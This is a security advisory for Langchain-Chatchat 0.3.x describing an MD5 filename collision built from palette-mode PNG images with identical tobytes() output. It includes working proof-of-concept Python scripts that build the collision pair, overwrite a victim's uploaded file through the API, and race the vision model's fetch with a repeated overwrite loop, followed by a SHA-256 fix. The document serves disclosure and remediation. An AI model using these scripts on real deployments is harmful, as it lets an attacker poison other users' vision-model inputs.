# Vuln-1: Image Hash Collision via PIL tobytes() Metadata Loss

## Vulnerability Details

| Field | Value |
|-------|-------|
| **Vendor** | chatchat-space: https://github.com/chatchat-space/Langchain-Chatchat |
| **Product** | Langchain-Chatchat |
| **Affected Versions** | 0.3.x (at least 0.3.1.3) |
| **Vulnerability Type** | CWE-328: Use of Weak Hash |
| **Affected File** | `libs/chatchat-server/chatchat/webui_pages/dialogue/dialogue.py:278` |
| **Severity** | Medium |
| **CVSS 3.1** | AV:N/AC:H/PR:L/UI:R/S:U/C:N/I:H/A:N — 5.3 |

## Description

Langchain-Chatchat uses `PIL.Image.tobytes()` to compute an MD5 hash as the server-side filename for pasted images in the vision chat dialogue. `tobytes()` serializes only the raw pixel matrix (or palette index array for P-mode images), discarding critical metadata including image dimensions, mode, palette data (PLTE chunk), and transparency information (tRNS chunk).

An attacker can exploit the PNG Palette mode (P-mode) to construct two images that are **visually completely different** but produce **identical `tobytes()` output** — and therefore the same MD5 hash and the same server-side filename. No filename guessing is required; the collision pair deterministically generates the same filename.

### Vulnerable Code

```python
# libs/chatchat-server/chatchat/webui_pages/dialogue/dialogue.py:278
name = hashlib.md5(paste_image.image_data.tobytes()).hexdigest() + ".png"
```

## Collision Construction: PNG Palette Mode

PNG P-mode stores pixel data as palette indices separately from color definitions. `tobytes()` returns only the index array, completely ignoring palette contents. Two images sharing the same index array but different palettes yield identical `tobytes()` output.

```python
from PIL import Image, ImageDraw, ImageFont
import hashlib

width, height = 400, 80

# 1. Analyze text pixel regions
def draw_text_centered(text, size):
    img = Image.new('L', size, 0)
    draw = ImageDraw.Draw(img)
    font = ImageFont.load_default()
    bbox = draw.textbbox((0, 0), text, font=font)
    x = (size[0] - (bbox[2] - bbox[0])) // 2
    y = (size[1] - (bbox[3] - bbox[1])) // 2
    draw.text((x, y), text, font=font, fill=255)
    return list(img.getdata())

pixels_a = draw_text_centered("CONFIDENTIAL: Project Alpha", (width, height))
pixels_b = draw_text_centered("PUBLIC: Hello World", (width, height))

# 2. Build shared pixel index array
# Index 0: Background  Index 1: Overlap  Index 2: A-only  Index 3: B-only
indices = []
for pa, pb in zip(pixels_a, pixels_b):
    is_a, is_b = pa > 0, pb > 0
    if is_a and is_b:     indices.append(1)
    elif is_a:            indices.append(2)
    elif is_b:            indices.append(3)
    else:                 indices.append(0)

pixel_data = bytes(indices)

# 3. Different palettes — same indices, different visual output
WHITE, BLACK = (255, 255, 255), (0, 0, 0)
palette_a = list(WHITE) + list(BLACK) + list(BLACK) + list(WHITE) + [0,0,0]*252
palette_b = list(WHITE) + list(BLACK) + list(WHITE) + list(BLACK) + [0,0,0]*252

img_a = Image.new('P', (width, height))
img_a.putdata(list(pixel_data))
img_a.putpalette(bytes(palette_a))
# Visual: "CONFIDENTIAL: Project Alpha"

img_b = Image.new('P', (width, height))
img_b.putdata(list(pixel_data))
img_b.putpalette(bytes(palette_b))
# Visual: "PUBLIC: Hello World"

# 4. Verify collision
assert img_a.tobytes() == img_b.tobytes()  # True
hash_a = hashlib.md5(img_a.tobytes()).hexdigest()
hash_b = hashlib.md5(img_b.tobytes()).hexdigest()
assert hash_a == hash_b  # True — same filename generated
```

This technique extends to arbitrary color images (e.g., different company logos) via color quantization and pixel state analysis.

## Attack Chain

### Prerequisites

- Attacker and victim share the same Chatchat instance (multi-tenant)
- Attacker pre-constructs a collision image pair (A, B) where `A.tobytes() == B.tobytes()` with different visual content

### Service Architecture

```
User Browser
    |
    | Only accesses :8501 (Streamlit WebUI)
    v
Streamlit Process (:8501)  <- Server-side Python
    |
    | upload_image_file() -> POST :7861/v1/files
    | chat.completions   -> POST :7861/chat/chat/completions
    v
FastAPI Process (:7861)    <- Backend API (internal)
    |
    | chat() -> LangChain agent -> invoke vision model
    v
Xinference (:9997)         <- Vision LLM
    |
    | Fetches image via: GET :7861/v1/files/{id}/content
    v
FastAPI (:7861) -> FileResponse(disk file)  <- no cached snapshot
```

### Attack Flow

```
t0  Attacker pre-constructs collision pair:
      img_A (e.g., Apple Logo) and img_B (e.g., Google Logo)
      Both have identical tobytes() -> same MD5 -> same filename

t1  Victim pastes img_A via Streamlit
      -> name = MD5(img_A.tobytes()) + ".png"
      -> Server stores at: .../assistants/2026-04-01/{hash}.png
      -> Victim initiates vision chat

t2  Attacker pastes img_B via Streamlit (same day)
      -> name = MD5(img_B.tobytes()) + ".png"  (identical!)
      -> Server overwrites: .../assistants/2026-04-01/{hash}.png

t3  LLM fetches image via callback
      -> GET /v1/files/{id}/content -> returns attacker's image
      -> LLM generates response based on wrong image
```

### Attack Effect

| Victim's Perspective | What Actually Happens |
|---------------------|----------------------|
| Pasted Apple Logo | LLM analyzes Google Logo |
| Preview shows Apple Logo (`st.image` uses in-memory PIL object) | Server file replaced |
| Receives irrelevant response | Attacker poisoned LLM input |

## Proof of Concept

### Step 1 — Verify Collision

```bash
python exploit_step1_build_collision.py
# Output:
# img_a.tobytes() == img_b.tobytes(): True
# MD5(img_a) = MD5(img_b) = 9a0364b9e99bb480dd25e1f0284c8555
```

### Step 2 — File Overwrite via API

```python
import requests, io, hashlib
from PIL import Image

API = "http://127.0.0.1:7861"
img_a = Image.open("collision_output/img_a_confidential.png")
img_b = Image.open("collision_output/img_b_public.png")

name = hashlib.md5(img_a.tobytes()).hexdigest() + ".png"

# Victim uploads
buf_a = io.BytesIO(); img_a.save(buf_a, format="png"); buf_a.seek(0)
resp_a = requests.post(f"{API}/v1/files",
    files={"file": (name, buf_a, "image/png")}, data={"purpose": "assistants"})
file_id = resp_a.json()["id"]
original = requests.get(f"{API}/v1/files/{file_id}/content").content

# Attacker overwrites (same filename from collision)
buf_b = io.BytesIO(); img_b.save(buf_b, format="png"); buf_b.seek(0)
resp_b = requests.post(f"{API}/v1/files",
    files={"file": (name, buf_b, "image/png")}, data={"purpose": "assistants"})

replaced = requests.get(f"{API}/v1/files/{file_id}/content").content
assert file_id == resp_b.json()["id"]  # Same file_id
assert original != replaced             # Content changed
```

### Step 3 — TOCTOU Race Condition

```python
import requests, threading, time, io, hashlib
from PIL import Image

API = "http://127.0.0.1:7861"
img_a = Image.open("collision_output/img_a_confidential.png")
img_b = Image.open("collision_output/img_b_public.png")
name = hashlib.md5(img_a.tobytes()).hexdigest() + ".png"

buf_b = io.BytesIO(); img_b.save(buf_b, format="png")
payload_b = buf_b.getvalue()

stop = threading.Event()
def overwrite_loop():
    while not stop.is_set():
        requests.post(f"{API}/v1/files",
            files={"file": (name, payload_b, "image/png")},
            data={"purpose": "assistants"})
        time.sleep(0.2)

# Victim uploads
buf_a = io.BytesIO(); img_a.save(buf_a, format="png")
resp = requests.post(f"{API}/v1/files",
    files={"file": (name, buf_a.getvalue(), "image/png")},
    data={"purpose": "assistants"})
file_id = resp.json()["id"]

# Attacker starts continuous overwrite
t = threading.Thread(target=overwrite_loop, daemon=True); t.start()

# Simulate LLM fetch delay
time.sleep(1)
fetched = requests.get(f"{API}/v1/files/{file_id}/content").content
print(f"Tampered: {fetched != buf_a.getvalue()}")  # True
stop.set()
```

## Remediation

```python
# Before (vulnerable)
name = hashlib.md5(paste_image.image_data.tobytes()).hexdigest() + ".png"

# After (fixed): hash the complete PNG byte stream including all metadata
buffer = io.BytesIO()
paste_image.image_data.save(buffer, format="png")
name = hashlib.sha256(buffer.getvalue()).hexdigest() + ".png"
```

## References

- PIL `tobytes()` documentation: returns only raw pixel byte representation, without image metadata
- PNG specification PLTE chunk: palette stored independently from pixel data
- P-image collision technique: constructing P-mode collision pairs with arbitrary visual differences

## Credits

- Vulnerability Discovery: [dem0]
- Vulnerability Analysis: [dem0]

## Disclaimer

This vulnerability report is provided for educational and authorized security research purposes only. The information contained herein should be used responsibly and in accordance with applicable laws and regulations.
